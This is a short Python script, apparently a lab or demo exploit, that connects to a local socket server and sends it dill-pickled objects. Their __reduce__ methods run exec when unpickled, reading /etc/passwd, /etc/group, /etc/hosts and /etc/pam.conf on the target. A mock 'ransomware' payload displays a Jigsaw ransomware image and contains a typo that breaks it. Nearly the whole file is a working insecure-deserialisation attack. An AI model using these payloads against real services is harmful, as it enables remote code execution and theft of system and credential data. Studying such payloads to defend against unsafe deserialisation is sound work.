#!/usr/bin/env python3

import socket, dill, builtins
import sys
import time

HOST = "127.0.0.1"
PORT = 6060


class passwd(object):
    def __reduce__(self):
        return (builtins.exec, ("with open('/etc/passwd','r') as r: print(r.readlines())",))


class group(object):
    def __reduce__(self):
        return (builtins.exec, ("with open('/etc/group','r') as r: print(r.readlines())",))


# Attackers can override DNS and cause your system to communicate with imposter systems by messing with files like /etc/hosts and /etc/resolv.conf.
class hosts(object):
    def __reduce__(self):
        return (builtins.exec, ("with open('/etc/hosts','r') as r: print(r.readlines())",))


# The PAM configuration file, /etc/pam. conf , determines the authentication services to be used, and the order in which the services are used.
# This file can be edited to select authentication mechanisms for each system entry application.
class pam(object):
    def __reduce__(self):
        return (builtins.exec, ("with open('/etc/pam.conf','r') as r: print(r.readlines())",))


class randsomware(object):
    def __reduce__(self):
        # return (builtins.exec, ("with open('/etc/passwd','r') as r: print(r.readlines())",))
        stri = 'from PIL import Imaxge\nImage.open(' + "{}').show()".format("'./jigsaw-ransomware.gif")
        return (builtins.exec, (stri,))


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((HOST, PORT))

    while True:
        try:
            sock.sendall(dill.dumps(passwd()))
            print("send password attack")
            time.sleep(0.1)
            sock.sendall(dill.dumps(group()))
            print("send DNS attack")
            time.sleep(0.1)
            sock.sendall(dill.dumps(hosts()))
            print("send DNS attack")
            time.sleep(0.1)
            sock.sendall(dill.dumps(pam()))
            print("send authintication attack ")
            time.sleep(0.1)
            sock.sendall(dill.dumps(randsomware()))
            print("send open the gif attack")
            time.sleep(0.1)
            # print (sock.recv(1024))
        except socket.error:
            sys.exit()
        sock.close()
